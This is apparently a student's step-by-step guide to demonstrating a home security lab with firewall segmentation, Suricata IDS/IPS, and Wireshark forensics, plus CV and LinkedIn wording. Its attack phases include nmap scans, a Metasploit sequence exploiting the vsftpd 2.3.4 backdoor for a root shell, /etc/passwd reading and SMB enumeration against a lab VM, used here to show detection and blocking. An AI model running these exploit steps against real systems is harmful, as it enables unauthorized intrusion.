# 🛡️ CyberFortress Lab - Professional Demonstration Guide

> **Project Name Options (Pick One):**
> 1. **CyberFortress Lab** - Enterprise Security Testing Environment
> 2. **DefenseMatrix** - Network Security Operations Lab
> 3. **SentinelNet** - Intrusion Detection & Prevention Lab
> 4. **IronPerimeter** - Network Segmentation & Threat Detection Lab

---

## 📋 Demonstration Phases

| Phase | Focus | Duration |
|-------|-------|----------|
| Phase 1 | Network Architecture & Segmentation | 15 min |
| Phase 2 | Firewall Rules Verification | 15 min |
| Phase 3 | IDS Mode - Attack Detection | 20 min |
| Phase 4 | IPS Mode - Attack Prevention | 15 min |
| Phase 5 | Network Forensics (Wireshark) | 15 min |
| Phase 6 | Documentation & Screenshots | 20 min |

---

# PHASE 1: Network Architecture Verification

## Goal: Prove your network segmentation works

### Test 1.1: Verify All VMs Have Correct IPs

**On each VM, run:**

| VM | Command | Expected IP |
|----|---------|-------------|
| Kali | `ip a` | 10.10.30.x |
| Metasploitable | `ifconfig` | 10.10.20.x |
| Ubuntu | `ip a` | 10.10.10.x |

📸 **Screenshot 1:** All three VMs showing their IPs

---

### Test 1.2: Verify Segmentation (Attack Zone → DMZ = ALLOWED)

**From Kali:**
```bash
ping -c 4 10.10.20.50
```

📸 **Screenshot 2:** Successful ping from Attack zone to DMZ

---

### Test 1.3: Verify Segmentation (Attack Zone → LAN = BLOCKED)

**From Kali:**
```bash
ping -c 4 10.10.10.191
```

📸 **Screenshot 3:** Failed ping showing segmentation works

---

### Test 1.4: OPNsense Interface Overview

**In OPNsense GUI:**
```
Interfaces → Overview
```

📸 **Screenshot 4:** All interfaces showing status and IPs

---

# PHASE 2: Firewall Rules Verification

## Goal: Show professional firewall configuration

### View 2.1: Firewall Rules for Each Zone

**In OPNsense GUI:**
```
Firewall → Rules → [Each Interface]
```

📸 **Screenshot 5:** LAN firewall rules
📸 **Screenshot 6:** OPT1 (DMZ) firewall rules  
📸 **Screenshot 7:** OPT2 (Attack) firewall rules

---

### View 2.2: Firewall Live Log

```
Firewall → Log Files → Live View
```

Run a blocked ping from Kali → Ubuntu, watch it get logged.

📸 **Screenshot 8:** Live firewall log showing blocked traffic

---

# PHASE 3: IDS Mode - Attack Detection

## Goal: Demonstrate threat detection capabilities

### Attack 3.1: Network Reconnaissance

**From Kali:**
```bash
# Host discovery
nmap -sn 10.10.20.0/24

# Port scan
nmap -sS -sV 10.10.20.50
```

📸 **Screenshot 9:** Nmap scan results

**Check OPNsense:**
```
Services → Intrusion Detection → Alerts
```

📸 **Screenshot 10:** IDS alerts for scan detection

---

### Attack 3.2: Exploitation (vsftpd Backdoor)

**From Kali:**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.20.50
exploit
```

**In the shell, run:**
```bash
whoami
id
hostname
cat /etc/passwd | head -5
ifconfig
```

📸 **Screenshot 11:** Successful exploitation with root shell
📸 **Screenshot 12:** System commands proving access

**Check OPNsense Alerts:**

📸 **Screenshot 13:** IDS alert for vsftpd backdoor (SID 1000004)

---

### Attack 3.3: Additional Attacks for More Alerts

**From Kali:**
```bash
# FTP login attempt
ftp 10.10.20.50
# Try: anonymous / anonymous

# SMB enumeration
enum4linux -a 10.10.20.50

# Telnet attempt
telnet 10.10.20.50
```

📸 **Screenshot 14:** Multiple IDS alerts showing different attack types

---

# PHASE 4: IPS Mode - Attack PREVENTION

## Goal: Show that attacks can be BLOCKED, not just detected

### Enable IPS Mode

**In OPNsense GUI:**
```
Services → Intrusion Detection → Settings
```

Change:
- **IPS mode:** ☑ Enable (or set to "Protection")
- Click **Apply**

📸 **Screenshot 15:** IPS mode enabled setting

---

### Test 4.1: Try the Attack Again

**From Kali:**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.20.50
exploit
```

**Expected:** The exploit should FAIL because IPS blocked it!

📸 **Screenshot 16:** Exploit failure (connection blocked)

**Check OPNsense Alerts:**

📸 **Screenshot 17:** Alert showing action "DROP" instead of "ALLOWED"

---

### Comparison Table for Report

| Mode | Attack Result | Evidence |
|------|--------------|----------|
| IDS (Detection) | ✅ Attack succeeded, Alert generated | Screenshot 11-13 |
| IPS (Prevention) | ❌ Attack blocked | Screenshot 16-17 |

---

# PHASE 5: Network Forensics (Wireshark)

## Goal: Analyze attack traffic like a SOC analyst

### Capture 5.1: Start Capture on OPNsense

**SSH into OPNsense:**
```bash
ssh root@10.10.10.1

# Capture on DMZ interface
tcpdump -i em2 -w /tmp/attack_capture.pcap &
```

Run attacks from Kali, then stop capture:
```bash
pkill tcpdump
```

---

### Capture 5.2: Copy to Kali for Analysis

**From Kali:**
```bash
scp root@10.10.10.1:/tmp/attack_capture.pcap ~/
wireshark ~/attack_capture.pcap
```

---

### Analysis Filters in Wireshark

```
# Show all traffic from Kali
ip.addr == 10.10.30.50

# Show FTP traffic
ftp

# Show the backdoor connection
tcp.port == 6200

# Show SYN scan
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

📸 **Screenshot 18:** Wireshark showing attack traffic
📸 **Screenshot 19:** Wireshark showing backdoor connection (port 6200)

---

# PHASE 6: Documentation Summary

## Screenshots Checklist

| # | Description | File Name |
|---|------------|-----------|
| 1 | Network topology (VMs with IPs) | `01_network_topology.png` |
| 2 | Ping allowed (Attack→DMZ) | `02_ping_allowed.png` |
| 3 | Ping blocked (Attack→LAN) | `03_ping_blocked.png` |
| 4 | OPNsense interfaces | `04_opnsense_interfaces.png` |
| 5-7 | Firewall rules per zone | `05-07_firewall_rules.png` |
| 8 | Blocked traffic in live log | `08_blocked_traffic.png` |
| 9 | Nmap scan results | `09_nmap_scan.png` |
| 10 | IDS scan detection | `10_ids_scan_alert.png` |
| 11 | Successful exploit | `11_exploit_success.png` |
| 12 | Root shell proof | `12_root_shell.png` |
| 13 | IDS backdoor alert | `13_ids_backdoor_alert.png` |
| 14 | Multiple IDS alerts | `14_multiple_alerts.png` |
| 15 | IPS mode enabled | `15_ips_enabled.png` |
| 16 | Exploit blocked by IPS | `16_exploit_blocked.png` |
| 17 | IPS drop alert | `17_ips_drop_alert.png` |
| 18-19 | Wireshark analysis | `18-19_wireshark.png` |

---

## Key Documentation Points

### For Your LinkedIn Post:
- "Built enterprise-grade security lab with network segmentation"
- "Deployed IDS/IPS with custom detection rules"
- "Demonstrated both attack detection AND prevention"
- "Performed network forensics with Wireshark"

### For Your CV:
- "Designed and implemented segmented network with OPNsense firewall"
- "Configured Suricata IDS/IPS with custom threat detection rules"
- "Conducted penetration testing using Metasploit framework"
- "Performed packet analysis and threat hunting with Wireshark"

---

## 🏆 Project Names (Final Selection)

| Name | Why It's Good |
|------|---------------|
| **CyberFortress Lab** | Sounds strong, defensive focus |
| **SentinelNet** | IDS/IPS focus, professional |
| **IronPerimeter** | Emphasizes network defense |
| **BlueTeam Ops Lab** | Clear defensive security focus |
| **ThreatShield Lab** | Detection + prevention |

**My Top Pick: "CyberFortress Lab"** or **"SentinelNet"**
